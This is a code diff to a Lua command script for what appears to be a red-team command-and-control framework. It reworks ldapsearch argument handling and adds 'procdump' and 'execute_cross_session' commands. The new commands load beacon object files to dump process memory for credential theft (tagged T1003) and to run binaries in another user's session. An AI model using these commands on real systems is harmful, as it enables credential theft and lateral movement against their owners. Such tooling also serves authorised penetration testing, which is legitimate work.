@@ -869,27 +869,14 @@ opsec("askcreds", 9.0)
 
 -- ldapsearch
 local function run_ldapsearch(args, cmd)
-    local query = ""
-    local attributes = ""
-    local result_count = ""
-    local hostname = ""
-    local domain = ""
+    local query = cmd:Flags():GetString("query")
+    local attributes = cmd:Flags():GetString("attributes")
+    local result_count = cmd:Flags():GetString("result-count")
+    local hostname = cmd:Flags():GetString("hostname")
+    local domain = cmd:Flags():GetString("domain")
 
-    -- Check if using positional arguments first
-    if args and #args >= 1 then
-        -- Positional argument format: ldapsearch query [attributes] [result_count] [hostname] [domain]
-        query = args[1] or ""
-        attributes = args[2] or ""
-        result_count = args[3] or "0"
-        hostname = args[4] or ""
-        domain = args[5] or ""
-    else
-        -- Flag format
-        query = cmd:Flags():GetString("query")
-        attributes = cmd:Flags():GetString("attributes")
-        result_count = cmd:Flags():GetString("result-count")
-        hostname = cmd:Flags():GetString("hostname")
-        domain = cmd:Flags():GetString("domain")
+    if query == "" or query == nil then
+        query = args[1]
     end
 
     if query == "" then
@@ -898,16 +885,7 @@ local function run_ldapsearch(args, cmd)
 
     -- Set defaults
     if attributes == "" then
-        attributes = ""  -- Empty string means get all attributes
-    end
-    if result_count == "" then
-        result_count = "0"  -- 0 means get all results
-    end
-    if hostname == "" then
-        hostname = ""  -- Empty string means use Primary DC
-    end
-    if domain == "" then
-        domain = ""  -- Empty string means use Base domain Level
+        attributes = "*"  -- Empty string means get all attributes
     end
 
     -- Validate result_count is numeric
@@ -962,3 +940,46 @@ Defaults:
 
 Note: If paging fails, consider using nonpagedldapsearch instead
 ]])
+
+-- procdump
+
+local function run_procdump(cmd)
+    local pid = cmd:Flags():GetInt("pid")
+    local fileout = cmd:Flags():GetString("output_path")
+    local packed_args = bof_pack("iZ", pid, fileout)
+    local session = active()
+    local arch = session.Os.Arch
+    local bof_file = bof_path("procdump", arch)
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+local cmd_procdump = command("procdump", run_procdump, "Dump a process memory", "T1003")
+cmd_procdump:Flags():Int("pid", 0, "process id to dump")
+cmd_procdump:Flags():String("output_path", "C:\\Windows\\Temp\\procdump.dmp", "output path for the dump")
+opsec("procdump", 9.0)
+
+help("procdump", [[
+Dump a process memory:
+  procdump --pid 1234 --output-path C:\Windows\Temp\procdump.dmp
+]])
+
+-- ExecuteCrossSession
+
+local function run_execute_cross_session(cmd)
+    local session_id = cmd:Flags():GetInt("session_id")
+    local binary_path = cmd:Flags():GetString("binary_path")
+    if session_id == 0 then
+        error("session_id is empty")
+    end
+    if binary_path == "" then
+        error("binary_path is empty")
+    end
+
+    local session = active()
+    local arch  = session.Os.Arch
+    local packed_args = bof_pack("Zi", binary_path, session_id)
+    local bof_file = bof_path("execute_cross_session", arch)
+    return bof(session, script_resource(bof_file), packed_args, true)
+end
+local cmd_execute_cross_session = command("execute_cross_session", run_execute_cross_session, "Execute a binary on disk within the context of another logged-on user's session", "T1003")
+cmd_execute_cross_session:Flags():Int("session_id", 0, "the session ID of the user in which context the specified binary needs to be executed.")
+cmd_execute_cross_session:Flags():String("binary_path", "", "path to the binary that you like to execute")
